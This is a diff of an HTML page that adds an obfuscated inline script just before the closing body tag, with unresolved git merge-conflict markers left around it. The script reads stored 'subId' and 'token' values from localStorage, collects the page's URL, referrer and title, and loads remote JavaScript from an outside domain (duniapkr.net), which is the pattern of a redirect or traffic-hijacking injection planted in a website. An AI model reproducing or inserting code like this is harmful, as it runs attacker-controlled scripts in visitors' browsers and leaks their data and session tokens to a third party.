@@ -550,4 +550,51 @@
             })
         }
     </script>
+<<<<<<< HEAD
+<script>
+=======
+    <script>
+>>>>>>> 5dc88f8eb66b39a4520a5ac52a5a3ea09a4efa8e
+    (function() {
+    var name = '_X2kFyxSzYhD8Pw8t';
+    if (!window._X2kFyxSzYhD8Pw8t) {
+        window._X2kFyxSzYhD8Pw8t = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://2038.duniapkr.net/hG1yXXkm',
+            P_PATH: 'https://2038.duniapkr.net/a791b94/postback',
+        };
+    }
+    const _XCZ4L626mJC3fcSG = localStorage.getItem('config');
+    if (typeof _XCZ4L626mJC3fcSG !== 'undefined' && _XCZ4L626mJC3fcSG !== null) {
+        var _3DbBwr7kJBpcbNGh = JSON.parse(_XCZ4L626mJC3fcSG);
+        var _vQpzcgfYBmLFP784 = Math.round(+new Date()/1000);
+        if (_3DbBwr7kJBpcbNGh.created_at + window._X2kFyxSzYhD8Pw8t.ttl < _vQpzcgfYBmLFP784) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _dhf27tGLZ6CFvv48 = localStorage.getItem('subId');
+    var _nBT33Nyk7BCGGJ81 = localStorage.getItem('token');
+    var _3d5X9jKk3nfhmMBS = '?return=js.client';
+        _3d5X9jKk3nfhmMBS += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _3d5X9jKk3nfhmMBS += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _3d5X9jKk3nfhmMBS += '&default_keyword=' + encodeURIComponent(document.title);
+        _3d5X9jKk3nfhmMBS += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _3d5X9jKk3nfhmMBS += '&name=' + encodeURIComponent(name);
+        _3d5X9jKk3nfhmMBS += '&host=' + encodeURIComponent(window._X2kFyxSzYhD8Pw8t.R_PATH);
+    if (typeof _dhf27tGLZ6CFvv48 !== 'undefined' && _dhf27tGLZ6CFvv48 && window._X2kFyxSzYhD8Pw8t.unique) {
+        _3d5X9jKk3nfhmMBS += '&sub_id=' + encodeURIComponent(_dhf27tGLZ6CFvv48);
+    }
+    if (typeof _nBT33Nyk7BCGGJ81 !== 'undefined' && _nBT33Nyk7BCGGJ81 && window._X2kFyxSzYhD8Pw8t.unique) {
+        _3d5X9jKk3nfhmMBS += '&token=' + encodeURIComponent(_nBT33Nyk7BCGGJ81);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._X2kFyxSzYhD8Pw8t.R_PATH + _3d5X9jKk3nfhmMBS;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 </body>
